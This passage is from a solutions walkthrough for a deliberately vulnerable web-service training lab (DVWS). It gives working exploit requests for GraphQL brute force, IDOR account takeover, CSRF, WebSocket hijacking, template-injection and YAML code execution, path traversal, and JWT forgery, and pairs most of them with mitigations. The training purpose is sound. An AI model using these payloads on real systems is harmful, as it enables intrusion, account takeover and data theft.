The `../` sequences traverse out of the uploads directory. The file is written to `/tmp/pwned.txt` (or any writable path).

---

## 35. GraphQL Batching Brute Force

**Endpoint:** `POST /graphql`

**Description:** The GraphQL gateway allows ten POST requests per client in 30 seconds, counting each HTTP request once. Apollo Server also accepts an array of operations in one request. Each `userLogin` mutation checks a real account password, so a batch can test more passwords than the request limit permits as separate calls.

### Challenge

Compare eleven separate `userLogin` attempts with one HTTP request containing eleven login mutations. Include the real password in the batch and use the returned token on a protected REST endpoint.

### Solution

```json
POST /graphql HTTP/1.1
Content-Type: application/json

[
  {"query": "mutation { userLogin(username: \"test\", password: \"wrong1\") { token } }"},
  {"query": "mutation { userLogin(username: \"test\", password: \"wrong2\") { token } }"},
  {"query": "mutation { userLogin(username: \"test\", password: \"test\") { token } }"}
]
```

The wrong passwords return GraphQL authentication errors, while the matching password returns a JWT that works on `GET /api/v2/notes`. Expand the array to eleven guesses: the gateway still counts one HTTP request. Eleven separate POST requests from the same client receive HTTP 429 on the last request. The gateway currently trusts `X-Forwarded-For` for client identity, as described in challenge 30.

**Mitigation:** Apply a login-attempt budget to each `userLogin` resolver execution, including every operation in a batch, and use a trusted client identity for rate limiting.

---

## 36. GraphQL Sensitive Data Exposure

**Endpoint:** `POST /graphql` (mutation: `userLogin`)

**Description:** The `userLogin` mutation returns the `password` field, which contains the bcrypt hash.

### Challenge

Extract password hashes via the GraphQL login mutation.

### Solution

```graphql
POST /graphql HTTP/1.1
Content-Type: application/json

{
  "query": "mutation { userLogin(username: \"admin\", password: \"letmein\") { username password token } }"
}
```

Response:
```json
{
  "data": {
    "userLogin": {
      "username": "admin",
      "password": "$2b$10$...<bcrypt hash>...",
      "token": "eyJ..."
    }
  }
}
```

The bcrypt hash is returned alongside the valid JWT token.

### 36a. Role-blind GraphQL data access

**Endpoint:** `POST /graphql` (queries: `userSearchByUsername`, `userFindbyId`)

**Why a basic scanner may miss the impact:** The requests return valid GraphQL responses. The flaw becomes clear when you compare what an anonymous caller, a regular user, and an admin can access against the application's intended permissions.

### Challenge

Assume users should only see their own account details, admins may look up other users, and password hashes should never be returned. Check whether the API follows those rules.

### Solution

First, look up an account ID without signing in:

```json
{"query":"{ userSearchByUsername(username: \"admin\") { id username admin } }"}
```

Use the returned ID to query the account, still without an `Authorization` header:

```json
{"query":"{ userFindbyId(id: \"<account-id>\") { id username password admin } }"}
```

The API returns the account's password hash and admin status. Repeat the query with a regular user's token and with an ID belonging to another user. The resolver does not check the caller's role or ownership, so anonymous and regular users can read those fields for other accounts.

This is an authorization and data-exposure flaw: a scanner can confirm that the requests work, but a person must know which fields and accounts each role is allowed to access to judge the impact.

---

## 37. Unrestricted File Upload

**Endpoint:** `POST /api/upload`

**Description:** File upload only validates that the filename ends in `.xml`. There is no content-type validation or file content scanning. Files are written to a publicly accessible directory.

### Challenge

Upload a file with malicious content to the server.

### Solution

```
POST /api/upload HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="malicious.xml"
Content-Type: text/xml

<html>
<script>alert(document.cookie)</script>
</html>
------Boundary--
```

The file is saved to `/public/uploads/<username>/malicious.xml` and is directly accessible at `http://dvws.local/uploads/<username>/malicious.xml`. If served with the wrong MIME type or if MIME sniffing occurs, the embedded HTML/JavaScript executes.

---

## 38. Role-Based Profile Data Exposure

**Endpoint:** `GET /api/v2/users/:id/profile-details`

**Description:** The endpoint should show private contact details only when the caller is an administrator. It mistakenly checks whether the *profile owner* is an administrator. Any signed-in user can therefore see the email address and home address on the admin account's profile.

### Challenge

Compare what a regular user and an admin can see when requesting the same profiles. Which account's role controls whether private fields appear?

### Solution

Sign in as `test` and `admin` using `POST /api/v2/login`, with these JSON bodies:

```json
{"username":"test","password":"test"}
{"username":"admin","password":"letmein"}
```

Use the returned tokens for the requests below. Use a GraphQL query to find the admin account ID:

```json
{"query":"{ userSearchByUsername(username: \"admin\") { id username } }"}
```

Request the admin profile using the `test` account's token:

```
GET /api/v2/users/<admin-id>/profile-details HTTP/1.1
Host: dvws.local
Authorization: Bearer <test-user-token>
```

The response includes `email` and `homeAddress`, even though the caller is not an admin. Request the `test` profile with the admin token and those fields are absent. The code checks the profile owner's `admin` value instead of the caller's permissions. A scanner may report successful responses, but recognizing the role mismatch requires knowing the intended access rules.

---

## 39. Account Recovery IDOR Chain

**UI:** Account → Recovery
**Endpoints:** `POST /api/v2/account-recovery/lookup`, `POST /api/v2/account-recovery/reset`, `GET /api/v2/users/profile`

**Description:** The recovery lookup reveals a user's database ID from their email address. The reset endpoint accepts that ID and a new password without checking account ownership or proof of recovery. An attacker can chain these flaws to take over an account and read its profile data.

### Challenge

Sign in as `test`, open Account → Recovery, and use the account recovery workflow to take over the seeded customer account and view its synthetic profile details. Change the recovery target in the request.

**Seeded account:** `recovery-victim` / `victim@dvws.local`

### Solution

Start with an authenticated session and submit an email to the lookup endpoint:

```http
POST /api/v2/account-recovery/lookup HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{"email":"victim@dvws.local"}
```

The response includes the matching account's `userId`. Pass that ID and a new password to the reset endpoint:

```http
POST /api/v2/account-recovery/reset HTTP/1.1
Host: dvws.local
Authorization: Bearer <token>
Content-Type: application/json

{"userId":"<victim-id>","newPassword":"new-password"}
```

Sign in as `recovery-victim` with the new password, then open Account or call `/api/v2/users/profile` to see the account's fictional email and address. Both API endpoints require a valid token, but neither verifies that the caller owns the account being recovered.


### Defense Exercise

Describe or implement recovery-specific defenses: require a random, single-use, expiring token bound to the target account; rate-limit recovery attempts; and revoke that account's existing sessions after a password change. Repeat the recovery requests and confirm an authenticated user cannot reset another account's password.

## 40. Session Revocation After Password Change

**UI:** Account → Password
**Endpoints:** `POST /api/v2/login`, `POST /api/v2/users/change-password`, `GET /api/v2/users/profile`

**Description:** A password change updates the password but does not invalidate JWTs that were issued by ordinary logins before the change.

**Seeded account:** `session-victim` / `Session123!` (reset the database seed to restore it)

### Challenge

Sign in as the seeded account in two separate browser profiles or clients. In one, change the password from **Account → Password**. Use the other session's previously issued token to request the profile and confirm it still returns HTTP 200. Then try to create a new session with the old password; that login should fail.

### Solution

Log in twice as `session-victim` using `Session123!`, retaining both returned tokens. Change the password in one session from **Account → Password** or by calling the password endpoint with the first token. Then use the second token to request `/api/v2/users/profile`.

The second token still receives HTTP 200 even though a new login with `Session123!` fails. The password changed, but the previously issued JWT was not revoked.

### Defense exercise

Use short-lived access tokens with a revocation strategy, such as a per-user token version checked by the API or refresh-token rotation with revocation. Revoke all sessions after credential recovery or password changes, and verify that both existing and newly requested sessions follow the intended policy.

## 41. Cross-Site Request Forgery Through the Login Cookie

**UI:** Administration → Create user
**Endpoint:** `POST /api/v2/admin/create-user`

**Description:** This browser exercise uses the normal `auth_token` cookie and the existing cookie-authenticated account-creation flaw. It demonstrates that `HttpOnly` prevents script access to the cookie value but does not stop the browser attaching it to a cross-origin request. On HTTPS, DVWS sets the login cookie to `HttpOnly; Secure; SameSite=None`; browser third-party-cookie settings can still affect whether it is sent.

### Browser setup

Install and trust [mkcert](https://github.com/FiloSottile/mkcert), then from the repository create a local certificate (the output names match the optional compose overlay):

```sh
mkdir -p certs
mkcert -cert-file certs/dev-cert.pem -key-file certs/dev-key.pem dvws.local attacker.test partner.test
```

Add `127.0.0.1 dvws.local attacker.test partner.test` to your hosts file, then start the local environment with:

```sh
docker compose -f docker-compose.yml -f docker-compose.tls.yml up --build
```

Open `https://dvws.local:8443` and sign in as `admin` / `letmein`. Inspect the login response's `Set-Cookie` header. Then open `https://attacker.test:8443/attacker-lab.html?challenge=csrf` in the same browser and send the request. Modern browser third-party-cookie restrictions can affect the result. The default HTTP setup remains available for ordinary app flows.

### Challenge

Compare the normal login cookie over HTTP and HTTPS. On HTTP it is `HttpOnly; SameSite=Lax` without `Secure`; on HTTPS it is `HttpOnly; Secure; SameSite=None`. With HTTPS, send the attacker fixture request and inspect the Network panel: it posts JSON as `text/plain` to `/api/v2/admin/create-user`, and the browser supplies `auth_token` if cross-site cookies are permitted. The response is opaque to the attacker page, so verify account creation in DVWS as an administrator.

### Solution

The endpoint accepts the normal login cookie and parses JSON from `text/plain`, allowing the cross-origin request to bypass preflight. Its `Origin` is not checked and there is no CSRF token. `HttpOnly` does not prevent the browser from sending the cookie. The fixture uses `no-cors`, so the attacker page cannot inspect the response; an administrator can verify whether the new account was created.

### Defense exercise

Require a CSRF token or equivalent request validation for state-changing endpoints, reject unexpected origins, and avoid accepting authentication from cookies on endpoints designed only for bearer tokens. Keep session cookies `HttpOnly` and `Secure`; use `SameSite` as defense in depth rather than as the only CSRF defense.

## 42. JSONP Cross-Origin Profile Sharing

**UI:** Account → External access
**Endpoints:** `GET/PUT /api/v2/users/profile-sharing`, `GET /api/v2/profile-sharing/jsonp?callback=captureProfile`

**Description:** Account → External access lets the account holder select a partner origin and choose which profile fields to share. The settings persist until sharing is revoked. The JSONP endpoint uses the normal `auth_token` cookie and returns only selected fields. It intentionally fails to check that a request came from the configured partner origin, so any origin that can load the authenticated script can read the data.

### Challenge

Using the local HTTPS setup in challenge 41, sign into DVWS Cloud and select **Account → External access**. Set the partner origin to `https://partner.test:8443`, select one or more fields, and enable sharing. Then open `https://attacker.test:8443/attacker-lab.html?challenge=jsonp` in the same browser. The attacker origin is not the configured partner, yet its callback receives the selected fields when the browser sends the `auth_token` cookie. Reload Account to confirm the settings persist, then revoke sharing and reload the attacker fixture; the JSONP request should fail. Browser third-party-cookie restrictions may block the cookie.

### Solution

The configured partner origin is stored as the account holder's intended audience, but the JSONP endpoint never compares it with the request's `Origin`. A script request from `attacker.test` therefore succeeds whenever sharing is enabled and the browser attaches a valid `auth_token` cookie. JSONP executes in the embedding page's context, so the attacker's callback can read the selected profile fields. The callback name is validated to prevent JavaScript injection, but that does not enforce the intended origin. Revoking sharing disables the response.

### Defense exercise

Do not expose sensitive data through JSONP. Return JSON and apply a narrowly scoped CORS policy when cross-origin access is required. Keep authenticated responses out of shared caches and apply authorization at the data endpoint.

## 43. Cross-Site WebSocket Hijacking

**UI:** Account → Notifications
**Endpoints:** `GET /api/v2/notifications`, `PUT /api/v2/notifications/:id/read`, `wss://dvws.local:8443/ws/notifications`

**Description:** Account has a persistent per-account inbox and a live notification feed. The socket authenticates using the normal `auth_token` login cookie but deliberately does not validate the handshake Origin. An attacker origin can therefore read that account's notifications and mark them read.

### Challenge

Use the local HTTPS setup in challenge 41, sign into `https://dvws.local:8443`, and open Account → Notifications so the normal login cookie is present. From a page served at `https://attacker.test:8443`, run `new WebSocket('wss://dvws.local:8443/ws/notifications')` in the console and review the `snapshot` message. Send `JSON.stringify({ type: 'mark-read', id: '<notification id>' })` to alter an inbox item. Compare the handshake Origin with the missing Origin validation. This requires trusted local TLS and the two host mappings.

Requests without a valid `auth_token` cookie are rejected with HTTP 401. On HTTPS the login cookie is `HttpOnly; Secure; SameSite=None`, allowing the browser to attach it during the cross-origin WebSocket handshake. The normal HTTP development server instead uses `HttpOnly; SameSite=Lax` without `Secure`; Account still works same-origin, but that setup does not claim a browser-faithful cross-origin exploit.

### Solution

From the attacker page's browser console, open the socket and print the snapshot:

```js
const socket = new WebSocket('wss://dvws.local:8443/ws/notifications');
socket.onmessage = (event) => {
  const message = JSON.parse(event.data);
  console.log(message);
  if (message.type === 'snapshot') {
    const unread = message.notifications.find((notification) => !notification.read);
    if (unread) socket.send(JSON.stringify({ type: 'mark-read', id: unread._id }));
  }
};
```

The `snapshot` contains the signed-in user's notifications. If an unread item exists, the script sends its ID and the server replies with a successful `read` message; Account → Notifications then shows that item as read. In the browser's Network panel, inspect the WebSocket handshake: its `Origin` is `https://attacker.test:8443`, while the browser supplies the DVWS `auth_token` cookie for the `dvws.local` connection. The attacker script cannot read the HttpOnly cookie; it does not need to, because the browser attaches it automatically. The server checks that cookie but accepts the handshake without checking `Origin`, which lets the attacker page use the victim's authenticated socket.

**Mitigation:** Validate the WebSocket handshake `Origin` against an explicit allowlist before upgrading, and reject unexpected origins. Keep authentication and per-user authorization checks as well; cookie flags alone do not prevent cross-site WebSocket hijacking.

## 44. Server-Side Template Injection

**Endpoint:** `GET /api/v2/greeter?name=...`

**Description:** The greeter compiles the supplied `name` query parameter as a JavaScript template literal. Expressions inside `${...}` are evaluated by the server.

### Challenge

Make the server evaluate a harmless expression, then inspect the rendering code and demonstrate why untrusted template source can lead to server-side code execution.

### Solution

Start with a harmless expression:

```
GET /api/v2/greeter?name=%24%7B7*7%7D
```

The response is `Hello 49`. The parameter is inserted into a newly compiled function as template source. For a controlled local lab, a command expression such as `${process.mainModule.require('child_process').execSync('id').toString()}` demonstrates the impact. Do not expose this deliberately vulnerable service to untrusted networks.

**Mitigation:** Keep templates fixed and pass user input as escaped data. Never compile request values as template source.

## 45. Unsafe YAML Supplier Import

**Endpoint:** `POST /api/v2/integrations/supplier-orders/import`

**Scenario:** A retailer accepts YAML order batches from a supplier integration. The importer supports an optional post-import hook, and its YAML schema permits executable function tags.

### Challenge

Upload a normal supplier order batch, then show that a tagged post-import hook executes during the import. Keep the demonstration local and use only the provided marker-file proof.

### Solution

Create `orders.yaml`:

```yaml
supplier: Northstar Components
orders:
  - sku: BRG-104
    itemName: Bearing assembly
    quantity: 12
    unitPrice: 4.5
postImport: !js/function "require('fs').writeFileSync('/tmp/dvws-yaml-import-marker', 'executed')"
```

Upload it with a valid token:

```sh
curl -X POST http://dvws.local/api/v2/integrations/supplier-orders/import \
  -H 'Authorization: Bearer <token>' \
  -F 'file=@orders.yaml;type=text/yaml'
```

The response reports one imported order with its item details. The order is persisted under the authenticated account and appears in `GET /api/v2/resource-store` order history. `/tmp/dvws-yaml-import-marker` contains `executed`, proving that the function tag was deserialized and invoked during the same import.

The example is non-destructive, but the vulnerable parser can execute arbitrary JavaScript; the marker path does not sandbox it. Run this challenge only in an isolated lab.

**Mitigation:** Use a data-only YAML schema, reject custom executable tags, validate each imported field, and never invoke functions supplied by an uploaded document.

## 46. Cross-Customer Monthly Statement Path Traversal

**Endpoint:** `GET /api/v2/reports/monthly?period=YYYY-MM`

**Scenario:** An authenticated workspace user requests a monthly account statement built from their profile and Resource Store orders. Statements are cached by account and month. The report endpoint appends the caller-supplied `period` to that account's cache directory without checking that the resolved path stays inside it.

### Challenge

Sign in as `recovery-victim` and place a Resource Store order so the account has statement data. Request the current month's report to generate its cached statement. Then sign in as `test` and use path traversal in `period` to read the victim's statement. Compare the victim's ordinary report response with the response returned to `test`.

### Solution

```sh
PERIOD=$(date +%Y-%m)

curl -X POST 'http://dvws.local/api/v2/resource-store/orders' \
  -H 'Authorization: Bearer <recovery-victim-token>' \
  -H 'Content-Type: application/json' \
  -d '{"itemId":"api-monitor","quantity":2}'

curl --get 'http://dvws.local/api/v2/reports/monthly' \
  -H 'Authorization: Bearer <recovery-victim-token>' \
  --data-urlencode "period=$PERIOD"

curl --get 'http://dvws.local/api/v2/reports/monthly' \
  -H 'Authorization: Bearer <test-token>' \
  --data-urlencode "period=../recovery-victim/$PERIOD"
```

The final response contains the victim account's email address and monthly order details, including the two API Monitor units. The report was generated from DVWS account and Resource Store data; the cache file is stored under the victim's account directory in the server's temporary report cache.

**Mitigation:** Validate `period` as a strict year-month value, resolve the final path, and verify it remains beneath the authenticated user's report directory before reading it. Keep authenticated statements private in shared caches.

## 47. Notification Preference Mass Assignment

**Endpoint:** `PUT /api/v2/users/notification-preferences`

**Scenario:** A signed-in customer updates the email address and weekly digest setting used by notification delivery. The API copies every submitted field onto the account record, including fields outside the settings form.

### Challenge

Update ordinary notification settings, then add the account's `admin` field to the same request. Sign in again and inspect the permissions in the new token.

### Solution

```http
PUT /api/v2/users/notification-preferences HTTP/1.1
Host: dvws.local
Authorization: Bearer <customer-token>
Content-Type: application/json

{"email":"alerts@example.test","weeklyDigest":true,"admin":true}
```

The response shows `admin: true`. Log in again as that customer and request `/api/v2/users/checkadmin`; the new token has the administrator permission. Existing tokens retain the claims issued at login.

**Mitigation:** Build updates from an allowlist of notification fields and keep role changes in a separately authorized workflow.

## 48. Undocumented TRACE Diagnostics

**Endpoint:** `TRACE /internal/diagnostics` (intentionally absent from the front end and OpenAPI document)

**Scenario:** A developer leaves an internal diagnostics handler enabled after investigating account import failures. It returns operational metadata and account contact fields to anyone who can reach the service.

### Challenge

Discover the hidden route and HTTP method, then inspect what information the handler returns. Compare it with the published OpenAPI paths.

### Solution

```sh
curl -X TRACE http://dvws.local/internal/diagnostics
```

The response includes a build label, database connection state, and seeded account usernames, email addresses, and roles. The path does not appear in `/openAPI-spec.json`; method and path discovery therefore require inspecting the service behavior or source.

**Mitigation:** Remove diagnostics handlers from public builds or require explicit operator authorization, and keep diagnostic output free of account data.

## 49. Legacy Login Skips Password Verification

**Endpoint:** `POST /api/v1/login` (intentionally absent from OpenAPI)

**Scenario:** A legacy login handler looks up a user by username and issues a normal JWT without checking the submitted password. The browser continues to use the v2 login route.

### Challenge

Submit an incorrect password for the seeded `test` account to both login versions. Use any token returned by v1 to read a protected v2 endpoint. Try an unknown username as a control.

### Solution

```sh
curl -X POST http://dvws.local/api/v2/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","password":"wrong-password"}'

curl -X POST http://dvws.local/api/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"test","password":"wrong-password"}'

curl http://dvws.local/api/v2/notes \
  -H 'Authorization: Bearer <token-from-v1-login>'
```

V2 returns HTTP 401. V1 returns HTTP 200 and a token that can access the notes endpoint. An unknown username returns HTTP 404 from v1.

**Mitigation:** Require password verification on every authentication path and retire the legacy handler. Test all supported login versions against incorrect credentials.

## 50. Excessive Activity Report Page Size

**Endpoint:** `GET /api/v2/reports/activity?limit=N`

**Scenario:** Successful logins, note creation, and Resource Store orders create persistent account activity events. The authenticated report reads the caller's events from MongoDB. It defaults to 20 but accepts up to 5,000 in one response, so a populated account can request a much larger database result and response than the ordinary page.

### Challenge

Create a fresh account, sign in, and create at least 50 notes or Resource Store orders. Request the report with and without `limit=5000`; compare the record counts, returned event IDs, and response sizes. A token is required.

### Solution

```sh
for i in $(seq 1 50); do
  curl -s -X POST 'http://dvws.local/api/v2/notes' \
    -H 'Authorization: Bearer <token>' \
    -H 'Content-Type: application/json' \
    -d "{\"name\":\"Activity $i\",\"body\":\"Saved note $i\",\"type\":\"public\"}" > /dev/null
done

curl -s 'http://dvws.local/api/v2/reports/activity' \
  -H 'Authorization: Bearer <token>' -o default.json

curl -s 'http://dvws.local/api/v2/reports/activity?limit=5000' \
  -H 'Authorization: Bearer <token>' -o large.json

wc -c default.json large.json
```

For a fresh account with one login and 50 saved notes, the first response contains 20 events and the second contains 51. The larger request reads more persisted documents and transfers more bytes; it does not invent rows to reach the requested limit. Event `subject` values refer to the saved note or order IDs. Invalid, nonpositive, and above-5,000 limits return HTTP 400; the ceiling is a lab safety bound.

**Mitigation:** Enforce a small page-size cap, paginate results, and set response or resource budgets for expensive report operations.

---

## 51. Missing Security Headers

**Endpoint:** Homepage and API responses

**Description:** Responses omit `X-Frame-Options`, `Content-Security-Policy`, and `X-Content-Type-Options`, while disclosing the framework through `X-Powered-By: Express`.

### Challenge

Inspect representative responses and identify which browser security headers are missing and which implementation detail is exposed.

### Solution

```sh
curl -I http://dvws.local/
curl -I http://dvws.local/api/v1/info
```

Neither response sets `X-Frame-Options`, `Content-Security-Policy`, or `X-Content-Type-Options`; both include `X-Powered-By: Express`. This is a response header audit exercise.

**Mitigation:** Set an appropriate Content Security Policy, `X-Content-Type-Options: nosniff`, and framing policy such as `X-Frame-Options` or CSP `frame-ancestors`. Remove the `X-Powered-By` header.

---

## 52. GraphQL Alias Amplification

**Endpoint:** `POST /graphql`

**Description:** The endpoint accepts repeated aliases without a query complexity or resolver execution limit. Each alias invokes the database-backed `userSearchByUsername` resolver separately.

### Challenge

Use one GraphQL operation to make several backend lookups, then observe that one HTTP request can invoke the resolver many times.

### Solution

```graphql
{
  first: userSearchByUsername(username: "admin") { id username }
  second: userSearchByUsername(username: "test") { id username }
  third: userSearchByUsername(username: "nobody") { id username }
  fourth: userSearchByUsername(username: "admin") { id username }
}
```

Send this as the `query` field in a JSON `POST /graphql` request. The response includes a result for each alias. Add more uniquely named aliases to increase the number of resolver executions while still using a single HTTP request.

**Mitigation:** Apply query complexity and depth limits, cap aliases or resolver calls per operation, and set request time and resource budgets.

## 53. Predictable UUID Support Ticket IDOR

**Endpoints:** `POST /api/v2/support/tickets`, `GET /api/v2/support/tickets/:id`

**Scenario:** Support tickets use UUIDv1 identifiers. The notification inbox includes the ID of a ticket owned by the seeded `recovery-victim` account. UUIDv1 encodes a timestamp and may allow nearby IDs to be narrowed down when an attacker knows a ticket was created around the same time. This is a useful clue, not a guarantee that arbitrary UUIDv1 values can be predicted. The authenticated read endpoint checks that a ticket exists but omits an ownership check.

### Challenge

Sign in as `test` (`test` / `test`) and inspect the notification inbox for a ticket UUID. Create a ticket and inspect its UUID format and timestamp. Then request the notified ticket using its UUID, and compare the result with a malformed UUID and a valid but unknown UUID.

```sh
curl -X POST http://dvws.local/api/v2/support/tickets \
  -H 'Authorization: Bearer <test-token>' \
  -H 'Content-Type: application/json' \
  -d '{"subject":"Training access","message":"I need help accessing a course."}'
```

### Solution

```http
GET /api/v2/notifications HTTP/1.1
Host: dvws.local
Authorization: Bearer <test-token>
```

Use the UUID in the support-ticket notification:

```http
GET /api/v2/support/tickets/6f1d2a40-2f5b-11ef-9a31-0242ac120002 HTTP/1.1
Host: dvws.local
Authorization: Bearer <test-token>
```

The response contains the seeded `recovery-victim` ticket even though the caller is `test`. A malformed UUID returns `400 Invalid ticket ID`; a well-formed unknown UUID returns `404 Support ticket not found`.

**Mitigation:** Use unpredictable identifiers where that helps, and always enforce per-ticket authorization by checking that the authenticated user owns the requested record. Identifier format is not an authorization control.

---

## 54. Resource Store: Get an Item for Free

**Endpoints:** `GET /api/v2/resource-store`, `POST /api/v2/resource-store/orders`

**Scenario:** The authenticated Resource Store starts each user with 100 workspace credits. Prices come from a fixed server catalogue, while orders accept signed integer quantities. The order total is calculated as `unitPrice × quantity`; a negative quantity therefore increases the caller's balance and is stored in their order history.

### Challenge

Sign in to DVWS Cloud and open **Operations → Resource Store**. The wallet starts with 100 credits. Buy one API Monitor for 10 credits and inspect the request in the browser Network panel. Replay it with quantity `-1`:

```http
POST /api/v2/resource-store/orders HTTP/1.1
Host: dvws.local
Authorization: Bearer <your-token>
Content-Type: application/json

{"itemId":"api-monitor","quantity":-1}
```

The order response shows the 10 credits returned, restoring the balance to 100. The negative quantity and positive credit change also appear in **Recent orders**, completing the free item challenge.

**Mitigation:** Validate quantity as a positive integer at the server boundary, derive prices from trusted catalogue data, and enforce balance constraints in the same atomic transaction as order creation.

## 55. Resource Store: Increase Your Balance by 1,000 Credits

**Endpoints:** `GET /api/v2/resource-store`, `POST /api/v2/resource-store/orders`

**Prerequisite:** Complete [Challenge 54](#54-resource-store-get-an-item-for-free).

### Challenge

Continue in the Resource Store and inspect the captured order request. The API accepts nonzero integer quantities from -1000 through 1000. Change the API Monitor quantity to `-100`:

```http
POST /api/v2/resource-store/orders HTTP/1.1
Host: dvws.local
Authorization: Bearer <your-token>
Content-Type: application/json

{"itemId":"api-monitor","quantity":-100}
```

At 10 credits per item, the response shows a 1,000-credit increase. The order history records quantity `-100` and a positive 1,000-credit change. Zero, fractional, and out-of-range quantities and unknown item IDs are rejected. Wallets and orders are scoped to the authenticated user.

**Mitigation:** Validate quantity as a positive integer at the server boundary, derive prices from trusted catalogue data, and enforce balance constraints in the same atomic transaction as order creation.

## 56. JWT JKU Key Source Trust

**Endpoint:** Shared authentication used by protected routes, demonstrated with `GET /api/v2/admin/logs`

**Description:** The shared application JWT middleware follows an untrusted token's `jku` header and trusts the matching public key it retrieves. An attacker can publish their own JWK set, sign a token with its private key, and have the token accepted by protected application routes. This bypasses the normal login requirement and grants access under the identity and permissions in the forged claims.

### Challenge

Create an RSA key pair and publish its public key as a JWK set on a URL reachable from the DVWS server. Sign an RS256 JWT with header fields `jku` (the JWK set URL) and `kid` (the key ID), and payload `{"user":"admin","permissions":["user:admin"]}`. Include issuer `https://github.com/snoopysecurity`, then send the token to a protected route:

```sh
curl http://dvws.local/api/v2/admin/logs \
  -H 'Authorization: Bearer <attacker-signed-token>'
```

The shared middleware fetches the attacker's JWK set, verifies the token with that key, and returns the application's protected login logs.

**Mitigation:** Bind each issuer to a server-configured key set or pinned keys. Do not let an untrusted token choose the key source; validate `iss`, `aud`, allowed algorithms, and key ID against trusted configuration. The fetch has a timeout and response-size limit, but trust in the token-selected key source remains intentionally vulnerable.

## 57. JWT KID Path Traversal

**Endpoints:** Shared authentication on protected routes such as `GET /api/v2/users` and `GET /api/v2/resource-store`

**Description:** The shared application JWT middleware uses an untrusted JWT `kid` value as a filesystem path without constraining it to the key directory. Its legacy loader treats the selected file as Base64 key material. Traversing to `/dev/null` yields the one-byte NUL secret (`AA==`), allowing an attacker to forge a bearer token that passes authentication on protected application routes. This is an authentication bypass. The selected file is used only as signing-key material; the application does not return its contents, so this challenge does not demonstrate arbitrary file disclosure.

### Challenge

Sign an HS256 JWT with header `{"alg":"HS256","kid":"../../../../../../dev/null"}` and an administrator identity using the one-byte NUL secret. Request the real user-list endpoint first without a token, then with the forged token:

```sh
TOKEN=$(node -e 'const jwt=require("jsonwebtoken");process.stdout.write(jwt.sign({user:"admin",permissions:["user:admin"]},Buffer.from([0]),{algorithm:"HS256",issuer:"https://github.com/snoopysecurity",header:{kid:"../../../../../../dev/null"}}))')
curl http://dvws.local/api/v2/users \
  -H "Authorization: Bearer $TOKEN"
```

Without authentication, `/api/v2/users` returns HTTP 401. With the forged token, the shared middleware accepts it and the endpoint returns stored user accounts, including password hashes. A token forged for a Resource Store customer can also read that account's wallet and orders. An incorrectly signed token returns HTTP 401. The selected file supplies signing-key material; its contents are not returned by the application.

**Mitigation:** Treat `kid` as an identifier, not a path. Look it up in a fixed in-memory or configured key map; if files must be used, canonicalize the path and verify it remains beneath the key directory. Use high-entropy keys and pin the expected algorithm.

## 58. Resource Store Promotion Timing Side Channel

**Endpoints:** `POST /api/v2/resource-store/promotions/redeem`, `POST /api/v2/resource-store/promotions/timing/validate`

**Difficulty:** Intermediate.

**Learning objective:** Recognize that equal HTTP status codes can still reveal secret state through response time. Measure repeated requests, recover a secret one character at a time, and verify the effect with an authenticated wallet.

**Scenario:** Alongside the promotion stored in operational XML, the local lab seeds one private Resource Store campaign. Its code begins with `OPS-` and is followed by 12 hexadecimal characters. Wrong codes always return HTTP 404, but a submitted prefix of the private code takes a slower lookup path before returning 404. The delay is deliberately large enough to measure on a local lab. The private code is generated when the database is first seeded and remains stable while that database persists.

**Prerequisites and setup:** Node.js 22, Docker Compose, and a local DVWSNode checkout. Start the lab with `docker compose up --build -d`, then register a fresh account through `POST /api/v2/users` and sign in through `POST /api/v2/login`. For example, send `{"username":"timing-player","password":"TimingChallenge123!"}` to both endpoints, then keep the login response's bearer token for the requests below. The Compose startup seeds the private campaign. Use only the local lab address `http://127.0.0.1`.

### Challenge

Sign in, open **Operations → Resource Store**, and try a few different promotion code prefixes. Send authenticated JSON requests such as `{"code":"OPS-0"}` to `/api/v2/resource-store/promotions/redeem`. Compare the response times of repeated 404 responses, extending the slower prefix one hexadecimal character at a time. Recover the full private code, redeem it to add 175 credits, and submit the returned flag to the validation endpoint. The XPath promotion in challenge 8 is separate and does not complete this challenge.

### Solution

Use the included local solver after obtaining a bearer token with `POST /api/v2/login`:

```sh
DVWS_TOKEN='<your-token>' node scripts/solve-promotion-timing.js
```

The solver sends several requests for each possible next hexadecimal character, compares median response times, and retains the slowest prefix. For the final character, the correct request redeems the promotion and returns a `DVWS{promotion_timing_...}` flag. It then submits the flag to `/api/v2/resource-store/promotions/timing/validate`. To verify manually, POST `{"flag":"<returned flag>"}` there with the same bearer token. A 200 response of `{"valid":true}`, a 175-credit increase in `GET /api/v2/resource-store`, and one private campaign redemption are the success criteria. A wrong flag, another player's flag, or an account that has not redeemed the campaign receives `{"valid":false}`. Repeating redemption returns HTTP 409; repeating validation remains valid. The code and account-specific flag are local lab values; neither appears in the catalogue or ordinary release response.

**Why it works:** The private lookup searches for codes beginning with the submitted text. A matching prefix takes an extra database and delay path before the same 404 response is sent. Repeated measurements help separate that added work from normal network and process noise. Each successful guess reveals one more character without exposing the campaign record directly.

**Mitigation:** Do not perform different work based on a partially matching secret. Fetch a candidate by a nonsecret identifier, compare the complete code using a constant-time comparison, and apply a uniform response path for invalid codes. Avoid logging or returning secret codes and flags in diagnostic responses. Rate limits can reduce automated probing but do not replace removing the timing difference.

## Appendix: Quick Reference

### Endpoints by Vulnerability Category

| Category | Endpoints |
|----------|-----------|
| **Injection** | `/api/v2/passphrase`, `/api/v2/notesearch`, `/api/v2/sysinfo/:cmd`, `/dvwsuserservice`, `/api/v2/release/:r`, `/api/v2/users/ldap-search` |
| **Broken Auth** | All authenticated endpoints (JWT none/weak secret), `/api/v1/login`, `/api/v2/users/change-password` |
| **JWT Key Handling** | Shared auth middleware (`jku` trust and `kid` path traversal) |
| **Data Exposure** | `/api/v1/info`, `/api/v2/users`, `/api/v2/users/:id/profile-details`, `/api/v2/users/profile`, `/api/v2/account-recovery/lookup`, `/graphql` (userLogin, userSearchByUsername, userFindbyId) |
| **XXE/XML** | `/dvwsuserservice`, `/api/v2/notes/import/xml`, `/api/v2/users/profile/export/xml`, `/api/v2/users/profile/import/xml` |
